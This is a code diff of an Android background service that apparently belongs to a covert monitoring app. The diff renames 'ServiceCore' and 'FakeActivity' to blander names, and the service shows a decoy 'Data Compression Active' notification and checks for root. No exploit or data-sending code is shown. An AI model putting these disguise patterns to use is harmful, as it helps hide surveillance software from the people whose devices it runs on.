@@ -14,7 +14,7 @@ import com.android.networking.util.Check;
 /**
  * The Class ServiceCore.
  */
-public class ServiceCore extends Service {
+public class ServiceMain extends Service {
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
 	private boolean needsNotification = false;
 	private Core core;
@@ -35,7 +35,7 @@ public class ServiceCore extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("32.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, Messages.getString("32_1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 		
 		needsNotification = Root.isNotificationNeeded();		
@@ -45,7 +45,7 @@ public class ServiceCore extends Service {
 			Notification note = new Notification(R.drawable.notify_icon, "Data Compression Active",
 					System.currentTimeMillis());
 
-			Intent i = new Intent(this, FakeActivity.class);
+			Intent i = new Intent(this, LocalActivity.class);
 
 			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
 
@@ -89,7 +89,7 @@ public class ServiceCore extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("36.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, Messages.getString("36_3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
 
@@ -102,7 +102,7 @@ public class ServiceCore extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("36.4"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, Messages.getString("36_4"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
 
@@ -115,7 +115,7 @@ public class ServiceCore extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("36.5"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, Messages.getString("36_5"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
 
@@ -128,7 +128,7 @@ public class ServiceCore extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("36.6"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, Messages.getString("36_6"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 
 		return ret;
@@ -143,7 +143,7 @@ public class ServiceCore extends Service {
 		}
 
 		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			Toast.makeText(this, Messages.getString("32_3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 
 		core.Stop();
